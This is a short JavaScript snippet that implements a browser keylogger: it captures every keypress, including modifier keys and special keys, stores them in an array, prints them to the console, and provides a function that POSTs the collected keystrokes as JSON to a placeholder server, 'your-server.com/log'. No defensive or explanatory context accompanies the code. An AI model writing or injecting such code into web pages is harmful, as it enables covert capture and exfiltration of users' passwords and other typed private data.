// Initialize an array to store keypress logs
let keyLog = [];

document.onkeydown = function(e) {
    e = e || window.event;
    
    // Get the pressed key
    let key = e.key;

    // Check for modifier keys (e.g., Shift, Ctrl, Alt)
    let modifiers = [];
    if (e.shiftKey) modifiers.push("Shift");
    if (e.ctrlKey) modifiers.push("Ctrl");
    if (e.altKey) modifiers.push("Alt");
    if (e.metaKey) modifiers.push("Meta"); // For Windows (or Command on macOS)

    // Handle special function keys
    switch (key) {
        case "Escape":
            key = "Esc";
            break;
        case "Backspace":
            key = "Backspace";
            break;
        case "Delete":
            key = "Delete";
            break;
        case "CapsLock":
            key = "Caps Lock";
            break;
        case "Enter":
            key = "Enter";
            break;
        case "Tab":
            key = "Tab";
            break;
        case "ArrowUp":
            key = "Up Arrow";
            break;
        case "ArrowDown":
            key = "Down Arrow";
            break;
        case "ArrowLeft":
            key = "Left Arrow";
            break;
        case "ArrowRight":
            key = "Right Arrow";
            break;
        case "Home":
            key = "Home";
            break;
        case "End":
            key = "End";
            break;
        case "PageUp":
            key = "Page Up";
            break;
        case "PageDown":
            key = "Page Down";
            break;
        case "Insert":
            key = "Insert";
            break;
        case "F1": case "F2": case "F3": case "F4":
        case "F5": case "F6": case "F7": case "F8":
        case "F9": case "F10": case "F11": case "F12":
            // Recognize function keys F1-F12
            key = key;
            break;
        default:
            break;
    }

    // Format output with modifiers if present
    let output = modifiers.length > 0 ? `[${modifiers.join('+')}] + ${key}` : key;

    keyLog.push(output); // Store key press in the array
    console.log(output); // Print to console
}

// Function to send the key log to a server (if needed)
function sendKeyLog() {
    fetch('http://your-server.com/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ keyLog: keyLog })
    }).then(response => {
        console.log("Key log sent to server");
    }).catch(error => {
        console.error("Error sending key log:", error);
    });
}
